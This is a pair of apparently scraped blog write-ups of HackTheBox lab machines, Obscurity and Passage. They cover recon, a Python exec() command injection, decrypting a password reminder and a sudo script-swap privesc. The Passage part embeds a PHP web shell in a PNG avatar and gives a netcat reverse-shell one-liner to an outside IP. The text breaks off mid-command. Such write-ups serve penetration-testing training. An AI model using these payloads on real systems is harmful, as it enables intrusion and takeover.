8080/tcp open http-proxy BadHTTPServer |_http-server-header: BadHTTPServer |_http-title: 0bscura | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Date: Sun, 29 Oct 2023 20:10:17 | Server: BadHTTPServer | Last-Modified: Sun, 29 Oct 2023 20:10:17 | Content-Length: 4171 | Content-Type: text/html | Connection: Closed | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;0bscura\u0026lt;/title\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=Edge\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;keywords\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;!-- | Easy Profile Template | http://www.templatemo.com/tm-467-easy-profile | \u0026lt;!-- stylesheet css --\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/templatemo-blue.css\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body data-spy=\u0026#34;scroll\u0026#34; data-target=\u0026#34;.navbar-collapse\u0026#34;\u0026gt; | \u0026lt;!-- preloader section --\u0026gt; | \u0026lt;!-- | \u0026lt;div class=\u0026#34;preloader\u0026#34;\u0026gt; | \u0026lt;div class=\u0026#34;sk-spinner sk-spinner-wordpress\u0026#34;\u0026gt; | HTTPOptions: | HTTP/1.1 200 OK | Date: Sun, 29 Oct 2023 20:10:18 | Server: BadHTTPServer | Last-Modified: Sun, 29 Oct 2023 20:10:18 | Content-Length: 4171 | Content-Type: text/html | Connection: Closed | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;0bscura\u0026lt;/title\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=Edge\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;keywords\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;!-- | Easy Profile Template | http://www.templatemo.com/tm-467-easy-profile | \u0026lt;!-- stylesheet css --\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/templatemo-blue.css\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body data-spy=\u0026#34;scroll\u0026#34; data-target=\u0026#34;.navbar-collapse\u0026#34;\u0026gt; | \u0026lt;!-- preloader section --\u0026gt; | \u0026lt;!-- | \u0026lt;div class=\u0026#34;preloader\u0026#34;\u0026gt; |_ \u0026lt;div class=\u0026#34;sk-spinner sk-spinner-wordpress\u0026#34;\u0026gt; 9000/tcp closed cslistener 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.94%I=7%D=10/29%Time=653EBC5A%P=x86_64-pc-linux-gnu%r(G SF:etRequest,10FC,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\nDate:\\x20Sun,\\x2029\\x20Oct\\x202 SF:023\\x2020:10:17\\nServer:\\x20BadHTTPServer\\nLast-Modified:\\x20Sun,\\x2029 SF:\\x20Oct\\x202023\\x2020:10:17\\nContent-Length:\\x204171\\nContent-Type:\\x20 SF:text/html\\nConnection:\\x20Closed\\n\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=\\ SF:\u0026#34;en\\\u0026#34;\u0026gt;\\n\u0026lt;head\u0026gt;\\n\\t\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\t\u0026lt;title\u0026gt;0bscura\u0026lt;/title\u0026gt; SF:\\n\\t\u0026lt;meta\\x20http-equiv=\\\u0026#34;X-UA-Compatible\\\u0026#34;\\x20content=\\\u0026#34;IE=Edge\\\u0026#34;\u0026gt;\\n\\t SF:\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,\\x20initial- SF:scale=1\\\u0026#34;\u0026gt;\\n\\t\u0026lt;meta\\x20name=\\\u0026#34;keywords\\\u0026#34;\\x20content=\\\u0026#34;\\\u0026#34;\u0026gt;\\n\\t\u0026lt;meta\\x20n SF:ame=\\\u0026#34;description\\\u0026#34;\\x20content=\\\u0026#34;\\\u0026#34;\u0026gt;\\n\u0026lt;!--\\x20\\nEasy\\x20Profile\\x20Temp SF:late\\nhttp://www\\.templatemo\\.com/tm-467-easy-profile\\n--\u0026gt;\\n\\t\u0026lt;!--\\x20s SF:tylesheet\\x20css\\x20--\u0026gt;\\n\\t\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/bo SF:otstrap\\.min\\.css\\\u0026#34;\u0026gt;\\n\\t\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/font- SF:awesome\\.min\\.css\\\u0026#34;\u0026gt;\\n\\t\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/templ SF:atemo-blue\\.css\\\u0026#34;\u0026gt;\\n\u0026lt;/head\u0026gt;\\n\u0026lt;body\\x20data-spy=\\\u0026#34;scroll\\\u0026#34;\\x20data-targe SF:t=\\\u0026#34;\\.navbar-collapse\\\u0026#34;\u0026gt;\\n\\n\u0026lt;!--\\x20preloader\\x20section\\x20--\u0026gt;\\n\u0026lt;!--\\n SF:\u0026lt;div\\x20class=\\\u0026#34;preloader\\\u0026#34;\u0026gt;\\n\\t\u0026lt;div\\x20class=\\\u0026#34;sk-spinner\\x20sk-spinne SF:r-wordpress\\\u0026#34;\u0026gt;\\n\u0026#34;)%r(HTTPOptions,10FC,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\nDate:\\x2 SF:0Sun,\\x2029\\x20Oct\\x202023\\x2020:10:18\\nServer:\\x20BadHTTPServer\\nLast- SF:Modified:\\x20Sun,\\x2029\\x20Oct\\x202023\\x2020:10:18\\nContent-Length:\\x20 SF:4171\\nContent-Type:\\x20text/html\\nConnection:\\x20Closed\\n\\n\u0026lt;!DOCTYPE\\x2 SF:0html\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\u0026lt;head\u0026gt;\\n\\t\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\ SF:t\u0026lt;title\u0026gt;0bscura\u0026lt;/title\u0026gt;\\n\\t\u0026lt;meta\\x20http-equiv=\\\u0026#34;X-UA-Compatible\\\u0026#34;\\x20c SF:ontent=\\\u0026#34;IE=Edge\\\u0026#34;\u0026gt;\\n\\t\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=de SF:vice-width,\\x20initial-scale=1\\\u0026#34;\u0026gt;\\n\\t\u0026lt;meta\\x20name=\\\u0026#34;keywords\\\u0026#34;\\x20cont SF:ent=\\\u0026#34;\\\u0026#34;\u0026gt;\\n\\t\u0026lt;meta\\x20name=\\\u0026#34;description\\\u0026#34;\\x20content=\\\u0026#34;\\\u0026#34;\u0026gt;\\n\u0026lt;!--\\x20\\n SF:Easy\\x20Profile\\x20Template\\nhttp://www\\.templatemo\\.com/tm-467-easy-pr SF:ofile\\n--\u0026gt;\\n\\t\u0026lt;!--\\x20stylesheet\\x20css\\x20--\u0026gt;\\n\\t\u0026lt;link\\x20rel=\\\u0026#34;styles SF:heet\\\u0026#34;\\x20href=\\\u0026#34;css/bootstrap\\.min\\.css\\\u0026#34;\u0026gt;\\n\\t\u0026lt;link\\x20rel=\\\u0026#34;styleshee SF:t\\\u0026#34;\\x20href=\\\u0026#34;css/font-awesome\\.min\\.css\\\u0026#34;\u0026gt;\\n\\t\u0026lt;link\\x20rel=\\\u0026#34;styleshee SF:t\\\u0026#34;\\x20href=\\\u0026#34;css/templatemo-blue\\.css\\\u0026#34;\u0026gt;\\n\u0026lt;/head\u0026gt;\\n\u0026lt;body\\x20data-spy=\\ SF:\u0026#34;scroll\\\u0026#34;\\x20data-target=\\\u0026#34;\\.navbar-collapse\\\u0026#34;\u0026gt;\\n\\n\u0026lt;!--\\x20preloader\\x2 SF:0section\\x20--\u0026gt;\\n\u0026lt;!--\\n\u0026lt;div\\x20class=\\\u0026#34;preloader\\\u0026#34;\u0026gt;\\n\\t\u0026lt;div\\x20class=\\\u0026#34; SF:sk-spinner\\x20sk-spinner-wordpress\\\u0026#34;\u0026gt;\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 76.99 seconds Web server feroxbuster └─$ feroxbuster -u http://10.10.10.168:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,py --depth 2 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.168:8080 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [txt, php, html, py] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 2 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 18l 33w 414c http://10.10.10.168:8080/js/custom.js 200 GET 282l 556w 4706c http://10.10.10.168:8080/css/templatemo-blue.css 200 GET 4l 64w 23666c http://10.10.10.168:8080/css/font-awesome.min.css 200 GET 4l 50w 4235c http://10.10.10.168:8080/js/jquery.backstretch.min.js 200 GET 7l 430w 36816c http://10.10.10.168:8080/js/bootstrap.min.js 200 GET 0l 0w 93100c http://10.10.10.168:8080/js/jquery.min.js 200 GET 0l 0w 122540c http://10.10.10.168:8080/css/bootstrap.min.css 200 GET 123l 367w 4171c http://10.10.10.168:8080/ 200 GET 123l 367w 4171c http://10.10.10.168:8080/index.html Foothold We notice Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory on the web page We can start fuzzing But I had issues with running whole wordlist Assuming it was a moved to development directory, we can grep only dev words from the wordlist └─$ grep \u0026#34;dev\u0026#34; /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \u0026gt; dev.list └─$ wc -l dev.list 343 dev.list └─$ wfuzz -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w dev.list --hw 14 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py Total requests: 343 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000009: 200 170 L 498 W 5892 Ch \u0026#34;develop\u0026#34; 000000217: 404 6 L 18 W 195 Ch \u0026#34;IBM%20dev%20works%20release%20vfin\u0026#34; Total time: 14.85130 Processed Requests: 343 Filtered Requests: 341 Requests/sec.: 23.09561 http://10.10.10.168:8080/develop/SuperSecureServer.py Interesting function with exec \u0026lt;SNIP\u0026gt; def serveDoc(self, path, docRoot): path = urllib.parse.unquote(path) try: info = \u0026#34;output = \u0026#39;Document: {}\u0026#39;\u0026#34; # Keep the output for later debug exec(info.format(path)) # This is how you do string formatting, right? cwd = os.path.dirname(os.path.realpath(__file__)) docRoot = os.path.join(cwd, docRoot) if path == \u0026#34;/\u0026#34;: path = \u0026#34;/index.html\u0026#34; requested = os.path.join(docRoot, path[1:]) if os.path.isfile(requested): mime = mimetypes.guess_type(requested) mime = (mime if mime[0] != None else \u0026#34;text/html\u0026#34;) mime = MIMES[requested.split(\u0026#34;.\u0026#34;)[-1]] try: with open(requested, \u0026#34;r\u0026#34;) as f: data = f.read() except: with open(requested, \u0026#34;rb\u0026#34;) as f: data = f.read() status = \u0026#34;200\u0026#34; else: errorPage = os.path.join(docRoot, \u0026#34;errors\u0026#34;, \u0026#34;404.html\u0026#34;) mime = \u0026#34;text/html\u0026#34; with open(errorPage, \u0026#34;r\u0026#34;) as f: data = f.read().format(path) status = \u0026#34;404\u0026#34; except Exception as e: print(e) errorPage = os.path.join(docRoot, \u0026#34;errors\u0026#34;, \u0026#34;500.html\u0026#34;) mime = \u0026#34;text/html\u0026#34; with open(errorPage, \u0026#34;r\u0026#34;) as f: data = f.read() status = \u0026#34;500\u0026#34; return {\u0026#34;body\u0026#34;: data, \u0026#34;mime\u0026#34;: mime, \u0026#34;status\u0026#34;: status} The serveDoc is called from handleRequest self.good = True is hardcoded in __init__ function of Request class So serveDoc is always called def handleRequest(self, request, conn, address): if request.good: document = self.serveDoc(request.doc, DOC_ROOT) statusNum=document[\u0026#34;status\u0026#34;] else: document = self.serveDoc(\u0026#34;/errors/400.html\u0026#34;, DOC_ROOT) statusNum=\u0026#34;400\u0026#34; body = document[\u0026#34;body\u0026#34;] \u0026lt;SNIP\u0026gt; handleRequest is called from listenToClient def listenToClient(self, client, address): size = 1024 while True: try: data = client.recv(size) if data: # Set the response to echo back the received data req = Request(data.decode()) self.handleRequest(req, client, address) client.shutdown() client.close() else: raise error(\u0026#39;Client disconnected\u0026#39;) except: client.close() return False We can test an execution └─$ python3 Python 3.11.5 (main, Aug 29 2023, 15:31:31) [GCC 13.2.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import os \u0026gt;\u0026gt;\u0026gt; info = \u0026#34;output = \u0026#39;Document: {}\u0026#39;\u0026#34; \u0026gt;\u0026gt;\u0026gt; path = \u0026#34;/index.html\u0026#34; \u0026gt;\u0026gt;\u0026gt; exec(info.format(path)) \u0026gt;\u0026gt;\u0026gt; output \u0026#39;Document: /index.html\u0026#39; \u0026gt;\u0026gt;\u0026gt; Inject cmd \u0026gt;\u0026gt;\u0026gt; path = \u0026#34;/index.html\u0026#39;; os.system(\u0026#39;echo TEST\u0026#39;);\u0026#39;\u0026#34; \u0026gt;\u0026gt;\u0026gt; exec(info.format(path)) TEST \u0026gt;\u0026gt;\u0026gt; Let\u0026rsquo;s try to get a ping We have our rce Let\u0026rsquo;s get reverse shell User robert\u0026rsquo;s home directory www-data@obscure:/$ ls -lha home/robert/ total 60K drwxr-xr-x 7 robert robert 4.0K May 9 2022 . drwxr-xr-x 3 root root 4.0K May 9 2022 .. lrwxrwxrwx 1 robert robert 9 Sep 28 2019 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 robert robert 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 robert robert 3.7K Apr 4 2018 .bashrc drwxr-xr-x 2 root root 4.0K May 9 2022 BetterSSH drwx------ 2 robert robert 4.0K May 9 2022 .cache -rw-rw-r-- 1 robert robert 94 Sep 26 2019 check.txt drwxr-x--- 3 robert robert 4.0K May 9 2022 .config drwx------ 3 robert robert 4.0K May 9 2022 .gnupg drwxrwxr-x 3 robert robert 4.0K May 9 2022 .local -rw-rw-r-- 1 robert robert 185 Oct 4 2019 out.txt -rw-rw-r-- 1 robert robert 27 Oct 4 2019 passwordreminder.txt -rw-r--r-- 1 robert robert 807 Apr 4 2018 .profile -rwxrwxr-x 1 robert robert 2.5K Oct 4 2019 SuperSecureCrypt.py -rwx------ 1 robert robert 33 Oct 29 20:02 user.txt txt files www-data@obscure:/home/robert$ cat out.txt ¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v www-data@obscure:/home/robert$ cat check.txt Encrypting this file with your key should result in out.txt, make sure your key is correct! The encryption is simple, it basically add char values and mod them So we can decrypt if we enter plaintext instead of key to find a key www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -k \u0026#34;Encrypting this file with your key should result in out.txt, make sure your key is correct!\u0026#34; -d -o /dev/shm/key.txt ################################ # BEGINNING # # SUPER SECURE ENCRYPTOR # ################################ ############################ # FILE MODE # ############################ Opening file out.txt... Decrypting... Writing to /dev/shm/key.txt... www-data@obscure:/home/robert$ cat /dev/shm/key.txt alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich Since we know the key, we can decrypt passwordreminder.txt www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k \u0026#34;alexandrovich\u0026#34; -d -o /dev/shm/passwd ################################ # BEGINNING # # SUPER SECURE ENCRYPTOR # ################################ ############################ # FILE MODE # ############################ Opening file passwordreminder.txt... Decrypting... Writing to /dev/shm/passwd... www-data@obscure:/home/robert$ cat /dev/shm/passwd SecThruObsFTW www-data@obscure:/home/robert$ su - robert Password: robert@obscure:~$ Root sudo robert@obscure:~$ sudo -l Matching Defaults entries for robert on obscure: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User robert may run the following commands on obscure: (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py Since we are the owners robert\u0026rsquo;s home directory, we can move items inside it We will rename BetterSSH folder and create our folder with malicious script #!/usr/bin/env python3 import pty pty.spawn(\u0026#34;bash\u0026#34;) robert@obscure:~$ mv BetterSSH{,-old} robert@obscure:~$ ls BetterSSH-old check.txt out.txt passwordreminder.txt SuperSecureCrypt.py user.txt robert@obscure:~$ mkdir BetterSSH robert@obscure:~$ cd BetterSSH robert@obscure:~/BetterSSH$ nano BetterSSH.py robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py root@obscure:~/BetterSSH# There are other ways to privesc Check 0xdf ","date":"October 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/obscurity/images/obscurity.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/obscurity/","summary":"Obscurity Enumeration nmap └─$ nmap -Pn -p- 10.10.10.168 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 20:06 GMT Nmap scan report for 10.10.10.168 (10.10.10.168) Host is up (0.17s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp closed http 8080/tcp open http-proxy 9000/tcp closed cslistener Nmap done: 1 IP address (1 host up) scanned in 41.33 seconds └─$ nmap -Pn -p- -sC -sV 10.","tags":["HTB","python","feroxbuster","wfuzz","python-injection","command-injection","code-analysis","crypto","credentials","race-condition","injection","lxd","lxc","arbitrary-write","python-path"],"title":"[HTB] Machine: Obscurity"},{"categories":null,"contents":"Passage Enumeration nmap └─$ nmap -Pn -p- 10.10.10.206 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 19:01 GMT Nmap scan report for 10.10.10.206 (10.10.10.206) Host is up (0.17s latency). Not shown: 65468 filtered tcp ports (no-response), 65 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.206 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 19:05 GMT Nmap scan report for 10.10.10.206 (10.10.10.206) Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA) | 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA) |_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Passage News Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.01 seconds Web server The message is: Due to unusually large amounts of traffic, we have implemented Fail2Ban on our website. Let it be known that excessive access to our server will be met with a two minute ban on your IP Address. While we do not wish to lock out our legitimate users, this decision is necessary in order to ensure a safe viewing experience. Please proceed with caution as you browse through our extensive news selection. So I skip directory bruteforcing We can collect all possible usernames from the articles And we see RSS button on main page If we click it, we are navigated to RSS Feed If we remove rss.php, we are navigated to login page of CuteNews 2.1.2 We have a hit in searchsploit https://www.exploit-db.com/exploits/48800 It looks like it\u0026rsquo;s and RCE via user avatar So based on the exploit, we have to upload an user avatar with a webshell Let\u0026rsquo;s register Now we have to upload the avatar If try to upload shell.php, I receive an error Let\u0026rsquo;s use image file and add comments to it Use png, since jpg didn\u0026rsquo;t work for me └─$ exiftool -Comment=\u0026#39;\u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; system($_GET[\u0026#34;cmd\u0026#34;]); echo \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; ?\u0026gt;\u0026#39; avatar.png Warning: [minor] Text/EXIF chunk(s) found after PNG IDAT (fixed) - avatar.png 1 image files updated I\u0026rsquo;ll turn intercept in Burp and modify the extension to php and forward the request We have rce Let\u0026rsquo;s get reverse shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.4 6666 \u0026gt;/tmp/f - url-encoded User #1 Inside /var/www/html/CuteNews/ we have cdata folder with users folder www-data@passage:/var/www/html/CuteNews/cdata$ ls -lha total 112K drwxrwxrwx 11 www-data www-data 4.0K Nov 1 08:51 . drwxrwxr-x 9 www-data www-data 4.0K Jun 18 2020 .. -rw-rw-rw- 1 www-data www-data 2.1K Aug 20 2018 Default.tpl -rw-rw-rw- 1 www-data www-data 1.7K Aug 20 2018 Headlines.tpl drwxrwxrwx 2 www-data www-data 4.0K Aug 20 2018 archives -rwxrwxrwx 1 www-data www-data 0 Aug 20 2018 auto_archive.db.php drwxrwxrwx 2 www-data www-data 4.0K Jun 18 2020 backup drwxrwxrwx 2 www-data www-data 4.0K Aug 31 2020 btree drwxrwxrwx 2 www-data www-data 4.0K Aug 20 2018 cache -rwxrwxrwx 1 www-data www-data 0 Aug 20 2018 cat.num.php -rwxrwxrwx 1 www-data www-data 0 Aug 20 2018 category.db.php -rw-rw-rw- 1 www-data www-data 0 Aug 20 2018 comments.txt -rwxr-xr-x 1 www-data www-data 33K Jun 18 2020 conf.php -rwxrwxrwx 1 www-data www-data 1.7K Aug 20 2018 config.php -rwxrwxrwx 1 www-data www-data 15 Aug 20 2018 confirmations.php -rwxrwxrwx 1 www-data www-data 0 Aug 20 2018 csrf.php -rwxrwxrwx 1 www-data www-data 0 Aug 20 2018 flood.db.php -rw-r--r-- 1 www-data www-data 26 Jun 18 2020 flood.txt -rwxrwxrwx 1 www-data www-data 0 Aug 20 2018 idnews.db.php -rw-rw-rw- 1 www-data www-data 0 Aug 20 2018 installed.mark -rwxrwxrwx 1 www-data www-data 0 Aug 20 2018 ipban.db.php drwxrwxrwx 2 www-data www-data 4.0K Jun 18 2020 log drwxrwxrwx 2 www-data www-data 4.0K Aug 31 2020 news -rw-rw-rw- 1 www-data www-data 0 Aug 20 2018 news.txt -rw-rw-rw- 1 www-data www-data 0 Aug 20 2018 newsid.txt drwxrwxrwx 2 www-data www-data 4.0K Jun 18 2020 plugins -rw-rw-rw- 1 www-data www-data 0 Aug 20 2018 postponed_news.txt -rwxrwxrwx 1 www-data www-data 0 Aug 20 2018 replaces.php -rw-rw-rw- 1 www-data www-data 564 Aug 20 2018 rss.tpl -rwxrwxrwx 1 www-data www-data 0 Aug 20 2018 rss_config.php drwxrwxrwx 2 www-data www-data 4.0K Aug 20 2018 template -rw-rw-rw- 1 www-data www-data 0 Aug 20 2018 unapproved_news.txt drwxrwxrwx 2 www-data www-data 4.0K Nov 1 09:07 users -rwxrwxrwx 1 www-data www-data 58 Aug 20 2018 users.db.php -rw-r--r-- 1 www-data www-data 63 Nov 1 08:51 users.txt It contains files which looks like user files www-data@passage:/var/www/html/CuteNews/cdata/users$ ls -lha total 100K drwxrwxrwx 2 www-data www-data 4.0K Nov 1 09:07 . drwxrwxrwx 11 www-data www-data 4.0K Nov 1 08:51 .. -rwxr-xr-x 1 www-data www-data 133 Jun 18 2020 09.php -rw-r--r-- 1 www-data www-data 109 Aug 30 2020 0a.php -rw-r--r-- 1 www-data www-data 129 Nov 1 08:51 0c.php -rw-r--r-- 1 www-data www-data 125 Aug 30 2020 16.php -rwxr-xr-x 1 www-data www-data 437 Jun 18 2020 21.php -rw-r--r-- 1 www-data www-data 109 Aug 31 2020 32.php -rw-r--r-- 1 www-data www-data 581 Nov 1 09:07 46.php -rwxr-xr-x 1 www-data www-data 113 Jun 18 2020 52.php -rwxr-xr-x 1 www-data www-data 129 Jun 18 2020 5d.php -rwxr-xr-x 1 www-data www-data 129 Jun 18 2020 66.php -rw-r--r-- 1 www-data www-data 133 Aug 31 2020 6e.php -rwxr-xr-x 1 www-data www-data 117 Jun 18 2020 77.php -rwxr-xr-x 1 www-data www-data 481 Jun 18 2020 7a.php -rwxr-xr-x 1 www-data www-data 109 Jun 18 2020 8f.php -rwxr-xr-x 1 www-data www-data 129 Jun 18 2020 97.php -rwxr-xr-x 1 www-data www-data 489 Jun 18 2020 b0.php -rw-r--r-- 1 www-data www-data 109 Nov 1 08:51 b5.php -rwxr-xr-x 1 www-data www-data 481 Jun 18 2020 c8.php -rwxr-xr-x 1 www-data www-data 45 Jun 18 2020 d4.php -rwxr-xr-x 1 www-data www-data 45 Jun 18 2020 d5.php -rw-r--r-- 1 www-data www-data 1.2K Aug 31 2020 d6.php -rwxr-xr-x 1 www-data www-data 113 Jun 18 2020 fc.php -rw-r--r-- 1 www-data www-data 3.8K Aug 30 2020 lines -rw-r--r-- 1 www-data www-data 0 Jun 18 2020 users.txt File content ww-data@passage:/var/www/html/CuteNews/cdata/users$ cat 0a.php \u0026lt;?php die(\u0026#39;Direct call - access denied\u0026#39;); ?\u0026gt; YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0= If we check source code, it looks those files were generated using first 2 chars of the md5sum of the username core/db/coreflat.php \u0026lt;SNIP\u0026gt; function db_user_by_name($name, $index = FALSE) { $uex = array(); // Get from php-serialized array $cu = cn_touch_get(SERVDIR. path_construct(\u0026#39;cdata\u0026#39;,\u0026#39;users\u0026#39;,substr(md5($name), 0, 2).\u0026#39;.php\u0026#39;)); // Check at index if ($index) { $rd = fopen(cn_touch(SERVDIR . path_construct(\u0026#39;cdata\u0026#39;, \u0026#39;users\u0026#39;, \u0026#39;users.txt\u0026#39;)), \u0026#39;r\u0026#39;); while ($a = fgets($rd)) { list($uid) = explode(\u0026#39;:\u0026#39;, 2); $uex[base_convert($uid, 36, 10)] = TRUE; } fclose($rd); // user exists, but not in index if (isset($cu[\u0026#39;name\u0026#39;][$name]) \u0026amp;\u0026amp; !isset($uex[ $cu[\u0026#39;name\u0026#39;][$name][\u0026#39;id\u0026#39;] ])) { return NULL; } } \u0026lt;SNIP\u0026gt; We know that this box has 2 users Let\u0026rsquo;s check their files www-data@passage:/var/www/html/CuteNews/cdata/users$ ls /home nadav paul www-data@passage:/var/www/html/CuteNews/cdata/users$ echo -n nadav | md5sum 41e6ffead3de2412a078b075e053fdc0 - www-data@passage:/var/www/html/CuteNews/cdata/users$ echo -n paul | md5sum 6c63212ab48e8401eaf6b59b95d816a9 - But there are no files with those ids The content of the file looked like base64 let\u0026rsquo;s try to decode it www-data@passage:/var/www/html/CuteNews/cdata/users$ echo 